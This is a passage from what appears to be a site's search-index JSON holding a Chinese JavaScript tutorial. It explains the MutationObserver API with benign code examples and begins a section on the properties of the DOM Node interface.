\u5143\u7d20\uff0c\u5c31\u4f1a\u8fde\u7eed\u89e6\u53d11000\u4e2a\u63d2\u5165\u4e8b\u4ef6\uff0c\u6267\u884c\u6bcf\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\uff0c\u8fd9\u5f88\u53ef\u80fd\u9020\u6210\u6d4f\u89c8\u5668\u7684\u5361\u987f\uff1b\u800c Mutation Observer \u5b8c\u5168\u4e0d\u540c\uff0c\u53ea\u57281000\u4e2a\u6bb5\u843d\u90fd\u63d2\u5165\u7ed3\u675f\u540e\u624d\u4f1a\u89e6\u53d1\uff0c\u800c\u4e14\u53ea\u89e6\u53d1\u4e00\u6b21\u3002 Mutation Observer \u6709\u4ee5\u4e0b\u7279\u70b9\u3002 \u5b83\u7b49\u5f85\u6240\u6709\u811a\u672c\u4efb\u52a1\u5b8c\u6210\u540e\uff0c\u624d\u4f1a\u8fd0\u884c\uff08\u5373\u5f02\u6b65\u89e6\u53d1\u65b9\u5f0f\uff09\u3002 \u5b83\u628a DOM \u53d8\u52a8\u8bb0\u5f55\u5c01\u88c5\u6210\u4e00\u4e2a\u6570\u7ec4\u8fdb\u884c\u5904\u7406\uff0c\u800c\u4e0d\u662f\u4e00\u6761\u6761\u4e2a\u522b\u5904\u7406 DOM \u53d8\u52a8\u3002 \u5b83\u65e2\u53ef\u4ee5\u89c2\u5bdf DOM \u7684\u6240\u6709\u7c7b\u578b\u53d8\u52a8\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u53ea\u89c2\u5bdf\u67d0\u4e00\u7c7b\u53d8\u52a8\u3002","title":"\u6982\u8ff0"},{"location":"dom/mutationobserver/#mutationobserver","text":"\u4f7f\u7528\u65f6\uff0c\u9996\u5148\u4f7f\u7528 MutationObserver \u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u4e00\u4e2a\u89c2\u5bdf\u5668\u5b9e\u4f8b\uff0c\u540c\u65f6\u6307\u5b9a\u8fd9\u4e2a\u5b9e\u4f8b\u7684\u56de\u8c03\u51fd\u6570\u3002 1 var observer = new MutationObserver ( callback ); \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u5728\u6bcf\u6b21 DOM \u53d8\u52a8\u540e\u8c03\u7528\u3002\u8be5\u56de\u8c03\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u53d8\u52a8\u6570\u7ec4\uff0c\u7b2c\u4e8c\u4e2a\u662f\u89c2\u5bdf\u5668\u5b9e\u4f8b\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 var observer = new MutationObserver ( function ( mutations , observer ) { mutations . forEach ( function ( mutation ) { console . log ( mutation ); }); });","title":"MutationObserver \u6784\u9020\u51fd\u6570"},{"location":"dom/mutationobserver/#mutationobserver_1","text":"","title":"MutationObserver \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"dom/mutationobserver/#observe","text":"observe() \u65b9\u6cd5\u7528\u6765\u542f\u52a8\u76d1\u542c\uff0c\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002 \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u6240\u8981\u89c2\u5bdf\u7684 DOM \u8282\u70b9 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u6307\u5b9a\u6240\u8981\u89c2\u5bdf\u7684\u7279\u5b9a\u53d8\u52a8 1 2 3 4 5 6 7 8 var article = document . querySelector ( 'article' ); var options = { 'childList' : true , 'attributes' : true } ; observer . observe ( article , options ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c observe() \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u6240\u8981\u89c2\u5bdf\u7684DOM\u5143\u7d20\u662f article \uff0c\u7b2c\u4e8c\u4e2a\u662f\u6240\u8981\u89c2\u5bdf\u7684\u53d8\u52a8\u7c7b\u578b\uff08\u5b50\u8282\u70b9\u53d8\u52a8\u548c\u5c5e\u6027\u53d8\u52a8\uff09\u3002 \u89c2\u5bdf\u5668\u6240\u80fd\u89c2\u5bdf\u7684 DOM \u53d8\u52a8\u7c7b\u578b\uff08\u5373\u4e0a\u9762\u4ee3\u7801\u7684 options \u5bf9\u8c61\uff09\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002 childList \uff1a\u5b50\u8282\u70b9\u7684\u53d8\u52a8\uff08\u6307\u65b0\u589e\uff0c\u5220\u9664\u6216\u8005\u66f4\u6539\uff09\u3002 attributes \uff1a\u5c5e\u6027\u7684\u53d8\u52a8\u3002 characterData \uff1a\u8282\u70b9\u5185\u5bb9\u6216\u8282\u70b9\u6587\u672c\u7684\u53d8\u52a8\u3002 \u60f3\u8981\u89c2\u5bdf\u54ea\u4e00\u79cd\u53d8\u52a8\u7c7b\u578b\uff0c\u5c31\u5728 option \u5bf9\u8c61\u4e2d\u6307\u5b9a\u5b83\u7684\u503c\u4e3a true \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u81f3\u5c11\u5fc5\u987b\u540c\u65f6\u6307\u5b9a\u8fd9\u4e09\u79cd\u89c2\u5bdf\u7684\u4e00\u79cd\uff0c\u82e5\u5747\u672a\u6307\u5b9a\u5c06\u62a5\u9519\u3002 \u9664\u4e86\u53d8\u52a8\u7c7b\u578b\uff0c options \u5bf9\u8c61\u8fd8\u53ef\u4ee5\u8bbe\u5b9a\u4ee5\u4e0b\u5c5e\u6027\uff1a subtree \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5c06\u8be5\u89c2\u5bdf\u5668\u5e94\u7528\u4e8e\u8be5\u8282\u70b9\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u3002 attributeOldValue \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89c2\u5bdf attributes \u53d8\u52a8\u65f6\uff0c\u662f\u5426\u9700\u8981\u8bb0\u5f55\u53d8\u52a8\u524d\u7684\u5c5e\u6027\u503c\u3002 characterDataOldValue \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89c2\u5bdf characterData \u53d8\u52a8\u65f6\uff0c\u662f\u5426\u9700\u8981\u8bb0\u5f55\u53d8\u52a8\u524d\u7684\u503c\u3002 attributeFilter \uff1a\u6570\u7ec4\uff0c\u8868\u793a\u9700\u8981\u89c2\u5bdf\u7684\u7279\u5b9a\u5c5e\u6027\uff08\u6bd4\u5982 ['class','src'] \uff09\u3002 1 2 3 4 5 6 7 8 9 // \u5f00\u59cb\u76d1\u542c\u6587\u6863\u6839\u8282\u70b9\uff08\u5373<html>\u6807\u7b7e\uff09\u7684\u53d8\u52a8 mutationObserver . observe ( document . documentElement , { attributes : true , characterData : true , childList : true , subtree : true , attributeOldValue : true , characterDataOldValue : true }); \u5bf9\u4e00\u4e2a\u8282\u70b9\u6dfb\u52a0\u89c2\u5bdf\u5668\uff0c\u5c31\u50cf\u4f7f\u7528 addEventListener() \u65b9\u6cd5\u4e00\u6837\uff0c\u591a\u6b21\u6dfb\u52a0\u540c\u4e00\u4e2a\u89c2\u5bdf\u5668\u662f\u65e0\u6548\u7684\uff0c\u56de\u8c03\u51fd\u6570\u4f9d\u7136\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21\u3002\u5982\u679c\u6307\u5b9a\u4e0d\u540c\u7684 options \u5bf9\u8c61\uff0c\u4ee5\u540e\u9762\u6dfb\u52a0\u7684\u90a3\u4e2a\u4e3a\u51c6\uff0c\u7c7b\u4f3c\u8986\u76d6\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u89c2\u5bdf\u65b0\u589e\u7684\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 var insertedNodes = []; var observer = new MutationObserver ( function ( mutations ) { mutations . forEach ( function ( mutation ) { for ( var i = 0 ; i < mutation . addedNodes . length ; i ++ ) { insertedNodes . push ( mutation . addedNodes [ i ]); } }); console . log ( insertedNodes ); }); observer . observe ( document , { childList : true , subtree : true });","title":"observe()"},{"location":"dom/mutationobserver/#disconnecttakerecords","text":"disconnect() \u65b9\u6cd5\u7528\u6765\u505c\u6b62\u89c2\u5bdf\u3002\u8c03\u7528\u8be5\u65b9\u6cd5\u540e\uff0cDOM \u518d\u53d1\u751f\u53d8\u52a8\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u89c2\u5bdf\u5668\u3002 1 observer . disconnect (); takeRecords() \u65b9\u6cd5\u7528\u6765\u6e05\u9664\u53d8\u52a8\u8bb0\u5f55\uff0c\u5373\u4e0d\u518d\u5904\u7406\u672a\u5904\u7406\u7684\u53d8\u52a8\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u53d8\u52a8\u8bb0\u5f55\u7684\u6570\u7ec4\u3002 1 observer . takeRecords (); \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 // \u4fdd\u5b58\u6240\u6709\u6ca1\u6709\u88ab\u89c2\u5bdf\u5668\u5904\u7406\u7684\u53d8\u52a8 var changes = mutationObserver . takeRecords (); // \u505c\u6b62\u89c2\u5bdf mutationObserver . disconnect ();","title":"disconnect()\uff0ctakeRecords()"},{"location":"dom/mutationobserver/#mutationrecord","text":"DOM \u6bcf\u6b21\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u6761\u53d8\u52a8\u8bb0\u5f55\uff08MutationRecord \u5b9e\u4f8b\uff09\u3002\u8be5\u5b9e\u4f8b\u5305\u542b\u4e86\u4e0e\u53d8\u52a8\u76f8\u5173\u7684\u6240\u6709\u4fe1\u606f\u3002Mutation Observer \u5904\u7406\u7684\u5c31\u662f\u4e00\u4e2a\u4e2a MutationRecord \u5b9e\u4f8b\u6240\u7ec4\u6210\u7684\u6570\u7ec4\u3002 MutationRecord \u5bf9\u8c61\u5305\u542b\u4e86DOM\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u6709\u5982\u4e0b\u5c5e\u6027\uff1a type \uff1a\u89c2\u5bdf\u7684\u53d8\u52a8\u7c7b\u578b\uff08 attributes \u3001 characterData \u6216\u8005 childList \uff09\u3002 target \uff1a\u53d1\u751f\u53d8\u52a8\u7684DOM\u8282\u70b9\u3002 addedNodes \uff1a\u65b0\u589e\u7684DOM\u8282\u70b9\u3002 removedNodes \uff1a\u5220\u9664\u7684DOM\u8282\u70b9\u3002 previousSibling \uff1a\u524d\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 nextSibling \uff1a\u4e0b\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 attributeName \uff1a\u53d1\u751f\u53d8\u52a8\u7684\u5c5e\u6027\u3002\u5982\u679c\u8bbe\u7f6e\u4e86 attributeFilter \uff0c\u5219\u53ea\u8fd4\u56de\u9884\u5148\u6307\u5b9a\u7684\u5c5e\u6027\u3002 oldValue \uff1a\u53d8\u52a8\u524d\u7684\u503c\u3002\u8fd9\u4e2a\u5c5e\u6027\u53ea\u5bf9 attribute \u548c characterData \u53d8\u52a8\u6709\u6548\uff0c\u5982\u679c\u53d1\u751f childList \u53d8\u52a8\uff0c\u5219\u8fd4\u56de null \u3002","title":"MutationRecord \u5bf9\u8c61"},{"location":"dom/mutationobserver/#_2","text":"","title":"\u5e94\u7528\u793a\u4f8b"},{"location":"dom/mutationobserver/#_3","text":"\u4e0b\u9762\u7684\u4f8b\u5b50\u8bf4\u660e\u5982\u4f55\u8bfb\u53d6\u53d8\u52a8\u8bb0\u5f55\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var callback = function ( records ){ records . map ( function ( record ){ console . log ( 'Mutation type: ' + record . type ); console . log ( 'Mutation target: ' + record . target ); }); }; var mo = new MutationObserver ( callback ); var option = { 'childList' : true , 'subtree' : true }; mo . observe ( document . body , option ); \u4e0a\u9762\u4ee3\u7801\u7684\u89c2\u5bdf\u5668\uff0c\u89c2\u5bdf <body> \u7684\u6240\u6709\u4e0b\u7ea7\u8282\u70b9\uff08 childList \u8868\u793a\u89c2\u5bdf\u5b50\u8282\u70b9\uff0c subtree \u8868\u793a\u89c2\u5bdf\u540e\u4ee3\u8282\u70b9\uff09\u7684\u53d8\u52a8\u3002\u56de\u8c03\u51fd\u6570\u4f1a\u5728\u63a7\u5236\u53f0\u663e\u793a\u6240\u6709\u53d8\u52a8\u7684\u7c7b\u578b\u548c\u76ee\u6807\u8282\u70b9\u3002","title":"\u5b50\u5143\u7d20\u7684\u53d8\u52a8"},{"location":"dom/mutationobserver/#_4","text":"\u4e0b\u9762\u7684\u4f8b\u5b50\u8bf4\u660e\u5982\u4f55\u8ffd\u8e2a\u5c5e\u6027\u7684\u53d8\u52a8\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var callback = function ( records ) { records . map ( function ( record ) { console . log ( 'Previous attribute value: ' + record . oldValue ); }); }; var mo = new MutationObserver ( callback ); var element = document . getElementById ( '#my_element' ); var options = { 'attributes' : true , 'attributeOldValue' : true } mo . observe ( element , options ); \u4e0a\u9762\u4ee3\u7801\u5148\u8bbe\u5b9a\u8ffd\u8e2a\u5c5e\u6027\u53d8\u52a8\uff08 'attributes': true \uff09\uff0c\u7136\u540e\u8bbe\u5b9a\u8bb0\u5f55\u53d8\u52a8\u524d\u7684\u503c\u3002\u5b9e\u9645\u53d1\u751f\u53d8\u52a8\u65f6\uff0c\u4f1a\u5c06\u53d8\u52a8\u524d\u7684\u503c\u663e\u793a\u5728\u63a7\u5236\u53f0\u3002","title":"\u5c5e\u6027\u7684\u53d8\u52a8"},{"location":"dom/mutationobserver/#domcontentloaded","text":"\u7f51\u9875\u52a0\u8f7d\u7684\u65f6\u5019\uff0cDOM \u8282\u70b9\u7684\u751f\u6210\u4f1a\u4ea7\u751f\u53d8\u52a8\u8bb0\u5f55\uff0c\u56e0\u6b64\u53ea\u8981\u89c2\u5bdf DOM \u7684\u53d8\u52a8\uff0c\u5c31\u80fd\u5728\u7b2c\u4e00\u65f6\u95f4\u89e6\u53d1\u76f8\u5173\u4e8b\u4ef6\uff0c\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528 DOMContentLoaded \u4e8b\u4ef6\u3002 1 2 3 4 5 var observer = new MutationObserver ( callback ); observer . observe ( document . documentElement , { childList : true , subtree : true }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76d1\u542c document.documentElement \uff08\u5373\u7f51\u9875\u7684 <html> HTML \u8282\u70b9\uff09\u7684\u5b50\u8282\u70b9\u7684\u53d8\u52a8\uff0c subtree \u5c5e\u6027\u6307\u5b9a\u76d1\u542c\u8fd8\u5305\u62ec\u540e\u4ee3\u8282\u70b9\u3002\u56e0\u6b64\uff0c\u4efb\u610f\u4e00\u4e2a\u7f51\u9875\u5143\u7d20\u4e00\u65e6\u751f\u6210\uff0c\u5c31\u80fd\u7acb\u523b\u88ab\u76d1\u542c\u5230\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u4f7f\u7528 MutationObserver \u5bf9\u8c61\u5c01\u88c5\u4e00\u4e2a\u76d1\u542c DOM \u751f\u6210\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 ( function ( win ){ 'use strict' ; var listeners = []; var doc = win . document ; var MutationObserver = win . MutationObserver || win . WebKitMutationObserver ; var observer ; function ready ( selector , fn ){ // \u50a8\u5b58\u9009\u62e9\u5668\u548c\u56de\u8c03\u51fd\u6570 listeners . push ({ selector : selector , fn : fn }); if ( ! observer ){ // \u76d1\u542cdocument\u53d8\u5316 observer = new MutationObserver ( check ); observer . observe ( doc . documentElement , { childList : true , subtree : true }); } // \u68c0\u67e5\u8be5\u8282\u70b9\u662f\u5426\u5df2\u7ecf\u5728DOM\u4e2d check (); } function check (){ // \u68c0\u67e5\u662f\u5426\u5339\u914d\u5df2\u50a8\u5b58\u7684\u8282\u70b9 for ( var i = 0 ; i < listeners . length ; i ++ ){ var listener = listeners [ i ]; // \u68c0\u67e5\u6307\u5b9a\u8282\u70b9\u662f\u5426\u6709\u5339\u914d var elements = doc . querySelectorAll ( listener . selector ); for ( var j = 0 ; j < elements . length ; j ++ ){ var element = elements [ j ]; // \u786e\u4fdd\u56de\u8c03\u51fd\u6570\u53ea\u4f1a\u5bf9\u8be5\u5143\u7d20\u8c03\u7528\u4e00\u6b21 if ( ! element . ready ){ element . ready = true ; // \u5bf9\u8be5\u8282\u70b9\u8c03\u7528\u56de\u8c03\u51fd\u6570 listener . fn . call ( element , element ); } } } } // \u5bf9\u5916\u66b4\u9732ready win . ready = ready ; })( this ); // \u4f7f\u7528\u65b9\u6cd5 ready ( '.foo' , function ( element ){ // ... });","title":"\u53d6\u4ee3 DOMContentLoaded \u4e8b\u4ef6"},{"location":"dom/mutationobserver/#_5","text":"Paul Kinlan, Detect DOM changes with Mutation Observers Tiffany Brown, Getting to know mutation observers Michal Budzynski, JavaScript: The less known parts. DOM Mutations Jeff Griffiths, DOM MutationObserver \u2013 reacting to DOM changes without killing browser performance Addy Osmani, Detect, Undo And Redo DOM Changes With Mutation Observers Ryan Morr, Using Mutation Observers to Watch for Element Availability","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"dom/node/","text":"Node \u63a5\u53e3 \u00b6 \u6240\u6709 DOM \u8282\u70b9\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 Node \u63a5\u53e3\uff0c\u62e5\u6709\u4e00\u4e9b\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u662f DOM \u64cd\u4f5c\u7684\u57fa\u7840\u3002 \u5c5e\u6027 \u00b6 Node.prototype.nodeType \u00b6 nodeType \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u8282\u70b9\u7684\u7c7b\u578b\u3002 1 document . nodeType // 9 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u8282\u70b9\u7684\u7c7b\u578b\u503c\u4e3a9\u3002 Node \u5bf9\u8c61\u5b9a\u4e49\u4e86\u51e0\u4e2a\u5e38\u91cf\uff0c\u5bf9\u5e94\u8fd9\u4e9b\u7c7b\u578b\u503c\u3002 1 document . nodeType === Node . DOCUMENT_NODE // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u8282\u70b9\u7684 nodeType \u5c5e\u6027\u7b49\u4e8e\u5e38\u91cf Node.DOCUMENT_NODE \u3002 \u4e0d\u540c\u8282\u70b9\u7684 nodeType \u5c5e\u6027\u503c\u548c\u5bf9\u5e94\u7684\u5e38\u91cf\u5982\u4e0b\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\uff1a9\uff0c\u5bf9\u5e94\u5e38\u91cf Node.DOCUMENT_NODE \u5143\u7d20\u8282\u70b9\uff08element\uff09\uff1a1\uff0c\u5bf9\u5e94\u5e38\u91cf Node.ELEMENT_NODE \u5c5e\u6027\u8282\u70b9\uff08attr\uff09\uff1a2\uff0c\u5bf9\u5e94\u5e38\u91cf Node.ATTRIBUTE_NODE \u6587\u672c\u8282\u70b9\uff08text\uff09\uff1a3\uff0c\u5bf9\u5e94\u5e38\u91cf Node.TEXT_NODE \u6587\u6863\u7247\u65ad\u8282\u70b9\uff08DocumentFragment\uff09\uff1a11\uff0c\u5bf9\u5e94\u5e38\u91cf Node.DOCUMENT_FRAGMENT_NODE \u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08DocumentType\uff09\uff1a10\uff0c\u5bf9\u5e94\u5e38\u91cf Node.DOCUMENT_TYPE_NODE \u6ce8\u91ca\u8282\u70b9\uff08Comment\uff09\uff1a8\uff0c\u5bf9\u5e94\u5e38\u91cf Node.COMMENT_NODE \u786e\u5b9a\u8282\u70b9\u7c7b\u578b\u65f6\uff0c\u4f7f\u7528 nodeType \u5c5e\u6027\u662f\u5e38\u7528\u65b9\u6cd5\u3002 1 2 3 4 var node = document . documentElement . firstChild ; if ( node . nodeType === Node . ELEMENT_NODE ) { console . log ( '\u8be5\u8282\u70b9\u662f\u5143\u7d20\u8282\u70b9' ); } Node.prototype.nodeName \u00b6 nodeName \u5c5e\u6027\u8fd4\u56de\u8282\u70b9\u7684\u540d\u79f0\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello world</div> var div = document . getElementById ( 'd1' ); div . nodeName // \"DIV\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5143\u7d20\u8282\u70b9 <div> \u7684 nodeName \u5c5e\u6027\u5c31\u662f\u5927\u5199\u7684\u6807\u7b7e\u540d DIV \u3002 \u4e0d\u540c\u8282\u70b9\u7684 nodeName \u5c5e\u6027\u503c\u5982\u4e0b\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\uff1a #document \u5143\u7d20\u8282\u70b9\uff08element\uff09\uff1a\u5927\u5199\u7684\u6807\u7b7e\u540d \u5c5e\u6027\u8282\u70b9\uff08attr\uff09\uff1a\u5c5e\u6027\u7684\u540d\u79f0 \u6587\u672c\u8282\u70b9\uff08text\uff09\uff1a #text \u6587\u6863\u7247\u65ad\u8282\u70b9\uff08DocumentFragment\uff09\uff1a #document-fragment \u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08DocumentType\uff09\uff1a\u6587\u6863\u7684\u7c7b\u578b \u6ce8\u91ca\u8282\u70b9\uff08Comment\uff09\uff1a #comment Node.prototype.nodeValue \u00b6 nodeValue \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u672c\u8eab\u7684\u6587\u672c\u503c\uff0c\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \u53ea\u6709\u6587\u672c\u8282\u70b9\uff08text\uff09\u3001\u6ce8\u91ca\u8282\u70b9\uff08comment\uff09\u548c\u5c5e\u6027\u8282\u70b9\uff08attr\uff09\u6709\u6587\u672c\u503c\uff0c\u56e0\u6b64\u8fd9\u4e09\u7c7b\u8282\u70b9\u7684 nodeValue \u53ef\u4ee5\u8fd4\u56de\u7ed3\u679c\uff0c\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u4e00\u5f8b\u8fd4\u56de null \u3002\u540c\u6837\u7684\uff0c\u4e5f\u53ea\u6709\u8fd9\u4e09\u7c7b\u8282\u70b9\u53ef\u4ee5\u8bbe\u7f6e nodeValue \u5c5e\u6027\u7684\u503c\uff0c\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u8bbe\u7f6e\u65e0\u6548\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello world</div> var div = document . getElementById ( 'd1' ); div . nodeValue // null div . firstChild . nodeValue // \"hello world\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c div \u662f\u5143\u7d20\u8282\u70b9\uff0c nodeValue \u5c5e\u6027\u8fd4\u56de null \u3002 div.firstChild \u662f\u6587\u672c\u8282\u70b9\uff0c\u6240\u4ee5\u53ef\u4ee5\u8fd4\u56de\u6587\u672c\u503c\u3002 Node.prototype.textContent \u00b6 textContent \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u548c\u5b83\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"divA\">This is <span>some</span> text</div> document . getElementById ( 'divA' ). textContent // This is some text textContent \u5c5e\u6027\u81ea\u52a8\u5ffd\u7565\u5f53\u524d\u8282\u70b9\u5185\u90e8\u7684 HTML \u6807\u7b7e\uff0c\u8fd4\u56de\u6240\u6709\u6587\u672c\u5185\u5bb9\u3002 \u8be5\u5c5e\u6027\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u7684\u503c\uff0c\u4f1a\u7528\u4e00\u4e2a\u65b0\u7684\u6587\u672c\u8282\u70b9\uff0c\u66ff\u6362\u6240\u6709\u539f\u6765\u7684\u5b50\u8282\u70b9\u3002\u5b83\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\uff0c\u5c31\u662f\u81ea\u52a8\u5bf9 HTML \u6807\u7b7e\u8f6c\u4e49\u3002\u8fd9\u5f88\u9002\u5408\u7528\u4e8e\u7528\u6237\u63d0\u4f9b\u7684\u5185\u5bb9\u3002 1 document . getElementById ( 'foo' ). textContent = '<p>GoodBye!</p>' ; \u4e0a\u9762\u4ee3\u7801\u5728\u63d2\u5165\u6587\u672c\u65f6\uff0c\u4f1a\u5c06 <p> \u6807\u7b7e\u89e3\u91ca\u4e3a\u6587\u672c\uff0c\u800c\u4e0d\u4f1a\u5f53\u4f5c\u6807\u7b7e\u5904\u7406\u3002 \u5bf9\u4e8e\u6587\u672c\u8282\u70b9\uff08text\uff09\u3001\u6ce8\u91ca\u8282\u70b9\uff08comment\uff09\u548c\u5c5e\u6027\u8282\u70b9\uff08attr\uff09\uff0c textContent \u5c5e\u6027\u7684\u503c\u4e0e nodeValue \u5c5e\u6027\u76f8\u540c\u3002\u5bf9\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\uff0c\u8be5\u5c5e\u6027\u4f1a\u5c06\u6bcf\u4e2a\u5b50\u8282\u70b9\uff08\u4e0d\u5305\u62ec\u6ce8\u91ca\u8282\u70b9\uff09\u7684\u5185\u5bb9\u8fde\u63a5\u5728\u4e00\u8d77\u8fd4\u56de\u3002\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08doctype\uff09\u7684 textContent \u5c5e\u6027\u4e3a null \u3002\u5982\u679c\u8981\u8bfb\u53d6\u6574\u4e2a\u6587\u6863\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 document.documentElement.textContent \u3002 Node.prototype.baseURI \u00b6 baseURI \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u7f51\u9875\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u6d4f\u89c8\u5668\u6839\u636e\u8fd9\u4e2a\u5c5e\u6027\uff0c\u8ba1\u7b97\u7f51\u9875\u4e0a\u7684\u76f8\u5bf9\u8def\u5f84\u7684 URL\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u3002 1 2 3 4 // \u5f53\u524d\u7f51\u9875\u7684\u7f51\u5740\u4e3a // http://www.example.com/index.html document . baseURI // \"http://www.example.com/index.html\" \u5982\u679c\u65e0\u6cd5\u8bfb\u5230\u7f51\u9875\u7684 URL\uff0c baseURI \u5c5e\u6027\u8fd4\u56de null \u3002 \u8be5\u5c5e\u6027\u7684\u503c\u4e00\u822c\u7531\u5f53\u524d\u7f51\u5740\u7684 URL\uff08\u5373 window.location \u5c5e\u6027\uff09\u51b3\u5b9a\uff0c\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528 HTML \u7684 <base> \u6807\u7b7e\uff0c\u6539\u53d8\u8be5\u5c5e\u6027\u7684\u503c\u3002 1 < base href = \"http://www.example.com/page.html\" > \u8bbe\u7f6e\u4e86\u4ee5\u540e\uff0c baseURI \u5c5e\u6027\u5c31\u8fd4\u56de <base> \u6807\u7b7e\u8bbe\u7f6e\u7684\u503c\u3002 Node.prototype.ownerDocument \u00b6 Node.ownerDocument \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u6240\u5728\u7684\u9876\u5c42\u6587\u6863\u5bf9\u8c61\uff0c\u5373 document \u5bf9\u8c61\u3002 1 2 var d = p . ownerDocument ; d === document // true document \u5bf9\u8c61\u672c\u8eab\u7684 ownerDocument \u5c5e\u6027\uff0c\u8fd4\u56de null \u3002 Node.prototype.nextSibling \u00b6 Node.nextSibling \u5c5e\u6027\u8fd4\u56de\u7d27\u8ddf\u5728\u5f53\u524d\u8282\u70b9\u540e\u9762\u7684\u7b2c\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u540e\u9762\u6ca1\u6709\u540c\u7ea7\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello</div><div id=\"d2\">world</div> var d1 = document . getElementById ( 'd1' ); var d2 = document . getElementById ( 'd2' ); d1 . nextSibling === d2 // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d1.nextSibling \u5c31\u662f\u7d27\u8ddf\u5728 d1 \u540e\u9762\u7684\u540c\u7ea7\u8282\u70b9 d2 \u3002 